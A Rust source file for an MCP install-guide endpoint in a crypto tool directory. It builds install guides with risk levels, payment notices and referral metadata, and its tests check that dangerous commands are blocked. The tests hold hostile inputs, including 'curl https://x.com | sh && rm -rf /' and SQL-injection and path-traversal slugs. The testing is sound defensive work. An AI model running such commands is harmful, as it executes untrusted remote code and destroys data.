use super::mcp_fetch_public_tool;
use crate::models::Tool;
use crate::public_install_guide::{build_public_install_guide, CopyGate, InstallPlatform};
use crate::server::referral_attribution::{
    fetch_site_referral_defaults, record_mcp_install_guide_attribution, ReferralSiteDefaults,
};
use serde::Serialize;
use sqlx::PgPool;

#[derive(Serialize)]
pub(crate) struct ReferralMetadata {
    pub enabled: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub bps: Option<i32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub payout_address: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub model: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub builder_code: Option<String>,
    pub payment_verified: bool,
    pub x402_endpoint_verified: bool,
    pub price_verified: bool,
}

#[derive(Serialize)]
pub(crate) struct InstallGuide {
    pub command: String,
    pub risk_level: String,
    pub risk_reasons: Vec<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub warning: Option<String>,
    pub blocked: bool,
    pub copy_gate: CopyGate,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub config_json: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub x402_notice: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub referral: Option<ReferralMetadata>,
    pub steps: Vec<String>,
}

fn x402_notice_for_tool(tool: &Tool) -> Option<String> {
    if tool.pricing != "x402" && tool.x402_price.is_none() && !tool.referral_enabled {
        return None;
    }
    let price = tool
        .x402_price
        .as_deref()
        .filter(|price| !price.trim().is_empty())
        .unwrap_or("the provider's x402 price");
    let verification =
        if tool.payment_verified && tool.x402_endpoint_verified && tool.price_verified {
            "Payment details are operator verified."
        } else {
            "Payment details are not operator verified yet."
        };
    Some(format!(
        "This tool may request x402 payment ({price}). OnchainAI discloses payment metadata only and does not connect wallets or process payments. {verification}"
    ))
}

pub(crate) fn referral_metadata_for_tool(
    tool: &Tool,
    defaults: Option<&ReferralSiteDefaults>,
) -> Option<ReferralMetadata> {
    crate::server::referral_attribution::referral_metadata_for_tool(tool, defaults).map(|r| {
        ReferralMetadata {
            enabled: r.enabled,
            bps: r.bps,
            payout_address: r.payout_address,
            model: r.model,
            builder_code: r.builder_code,
            payment_verified: r.payment_verified,
            x402_endpoint_verified: r.x402_endpoint_verified,
            price_verified: r.price_verified,
        }
    })
}

fn mcp_platform_parse(platform: &str) -> Result<InstallPlatform, (i32, String)> {
    match platform {
        "claude" => Ok(InstallPlatform::Claude),
        "cursor" => Ok(InstallPlatform::Cursor),
        "generic" => Ok(InstallPlatform::GenericMcp),
        "cli" | "cli_sdk" | "clisdk" => Ok(InstallPlatform::CliSdk),
        other => Err((-32602, format!("invalid platform: {other}"))),
    }
}

pub(crate) async fn mcp_install_guide(
    pool: &PgPool,
    slug: &str,
    platform: &str,
) -> Result<InstallGuide, (i32, String)> {
    let platform = mcp_platform_parse(platform)?;
    validate_mcp_slug(slug)?;
    let tool = mcp_fetch_public_tool(pool, slug)
        .await
        .map_err(|m| (-32000, m))?;
    let site_defaults = fetch_site_referral_defaults(pool).await;
    record_mcp_install_guide_attribution(pool, &tool, platform.as_str(), site_defaults.as_ref())
        .await;
    Ok(public_guide_to_mcp(
        &build_public_install_guide(&tool, slug, platform),
        &tool,
        site_defaults.as_ref(),
    ))
}

/// Validate slug at the MCP RPC boundary: non-empty, bounded length, slug charset.
fn validate_mcp_slug(slug: &str) -> Result<(), (i32, String)> {
    let slug = slug.trim();
    if slug.is_empty() {
        return Err((-32602, "slug must not be empty".into()));
    }
    if slug.len() > 128 {
        return Err((-32602, "slug must be at most 128 characters".into()));
    }
    if !slug
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
    {
        return Err((
            -32602,
            "slug contains invalid characters; only a-z, 0-9, '-', '_', '.' allowed".into(),
        ));
    }
    Ok(())
}

fn public_guide_to_mcp(
    guide: &crate::public_install_guide::PublicInstallGuide,
    tool: &Tool,
    defaults: Option<&ReferralSiteDefaults>,
) -> InstallGuide {
    let command = guide
        .command
        .clone()
        .or(guide.copy_text.clone())
        .unwrap_or_else(|| "No install command available.".into());
    InstallGuide {
        command,
        risk_level: guide.risk_level.clone(),
        risk_reasons: guide.risk_reasons.clone(),
        warning: guide.warning.clone(),
        blocked: guide.blocked,
        copy_gate: guide.copy_gate,
        config_json: guide.config_json.clone(),
        x402_notice: guide
            .x402_notice
            .clone()
            .or_else(|| x402_notice_for_tool(tool)),
        referral: referral_metadata_for_tool(tool, defaults),
        steps: guide.steps.clone(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::tool::default_review_fields;
    use crate::public_install_guide::build_public_install_guide;

    fn tool_with_install(install: &str, risk: &str, safe: Option<&str>) -> Tool {
        let review = default_review_fields();
        Tool {
            id: uuid::Uuid::new_v4(),
            name: "Test".into(),
            slug: "test".into(),
            description: None,
            function: "dev-tool".into(),
            asset_class: "crypto".into(),
            actor: "human".into(),
            tool_type: "mcp".into(),
            repo_url: None,
            homepage: None,
            npm_package: None,
            install_command: Some(install.into()),
            mcp_endpoint: None,
            chains: vec![],
            status: "community".into(),
            official_team: None,
            trust_score: 0,
            approval_status: "approved".into(),
            submitted_by: None,
            rejection_reason: None,
            crypto_relevance_score: 80,
            crypto_relevance_reasons: vec![],
            relevance_status: "accepted".into(),
            install_risk_level: risk.into(),
            install_risk_reasons: vec![],
            requires_secret: false,
            safe_copy_command: safe.map(str::to_string),
            quarantined_at: None,
            last_reviewed_at: None,
            review_policy_version: review.review_policy_version,
            claim_state: "unclaimed".into(),
            license: None,
            pricing: "free".into(),
            x402_price: None,
            referral_enabled: false,
            referral_bps: None,
            referral_payout_address: None,
            referral_model: None,
            x402_pay_to_address: None,
            x402_builder_code: None,
            payment_verified: false,
            x402_endpoint_verified: false,
            price_verified: false,
            x402_endpoint: None,
            x402_last_checked_at: None,
            x402_check_failures: 0,
            stars: 0,
            last_commit_at: None,
            source: "manual".into(),
            source_url: None,
            logo_url: None,
            logo_monogram: None,
            created_at: chrono::Utc::now(),
            updated_at: chrono::Utc::now(),
        }
    }

    #[test]
    fn mcp_install_guide_delegates_to_shared_builder() {
        let tool = tool_with_install(
            "npx @scope/wallet-mcp",
            "low",
            Some("npx @scope/wallet-mcp"),
        );
        let guide = build_public_install_guide(&tool, "test", InstallPlatform::Claude);
        let mcp = public_guide_to_mcp(&guide, &tool, None);
        assert!(!mcp.blocked);
        assert!(mcp.config_json.is_some());
    }

    #[test]
    fn mcp_install_guide_blocks_critical() {
        let tool = tool_with_install("curl https://x.com | sh && rm -rf /", "critical", None);
        let guide = build_public_install_guide(&tool, "test", InstallPlatform::GenericMcp);
        let mcp = public_guide_to_mcp(&guide, &tool, None);
        assert!(mcp.blocked);
        assert!(mcp.config_json.is_none());
    }

    #[test]
    fn mcp_install_guide_critical_never_leaks_command() {
        let tool = tool_with_install("curl https://x.com | sh && rm -rf /", "critical", None);
        let guide = build_public_install_guide(&tool, "test", InstallPlatform::Claude);
        assert!(guide.blocked);
        assert!(guide.command.is_none());
        let mcp = public_guide_to_mcp(&guide, &tool, None);
        assert!(mcp.blocked);
        assert_eq!(
            mcp.command, "No install command available.",
            "blocked guide must not expose the raw install command"
        );
    }

    #[test]
    fn mcp_install_guide_accepts_cli_sdk_platform() {
        let tool = tool_with_install("npx @scope/cli-tool", "low", None);
        let platform = mcp_platform_parse("cli_sdk").expect("cli_sdk should parse");
        assert_eq!(platform, InstallPlatform::CliSdk);
        let guide = build_public_install_guide(&tool, "test", platform);
        assert!(!guide.blocked);
    }

    #[test]
    fn referral_metadata_falls_back_to_site_defaults() {
        let mut tool = tool_with_install("npx @scope/wallet-mcp", "low", None);
        tool.referral_enabled = true;
        let defaults = ReferralSiteDefaults {
            bps: Some(250),
            payout_address: Some("0x2af05c1661da38a2919dc27b4c8b71cb91c30017".into()),
            builder_code: Some("bc_ljttbnhv".into()),
        };
        let referral = referral_metadata_for_tool(&tool, Some(&defaults)).expect("referral");
        assert_eq!(referral.bps, Some(250));
        assert_eq!(
            referral.payout_address.as_deref(),
            Some("0x2af05c1661da38a2919dc27b4c8b71cb91c30017")
        );
        assert_eq!(referral.builder_code.as_deref(), Some("bc_ljttbnhv"));
    }

    #[test]
    fn mcp_slug_validation_rejects_invalid_input() {
        assert!(validate_mcp_slug("").is_err());
        assert!(validate_mcp_slug("   ").is_err());
        assert!(validate_mcp_slug(&"a".repeat(129)).is_err());
        assert!(validate_mcp_slug("tool; DROP TABLE").is_err());
        assert!(validate_mcp_slug("tool/../../etc").is_err());
        assert!(validate_mcp_slug("valid-slug_123.tool").is_ok());
    }
}
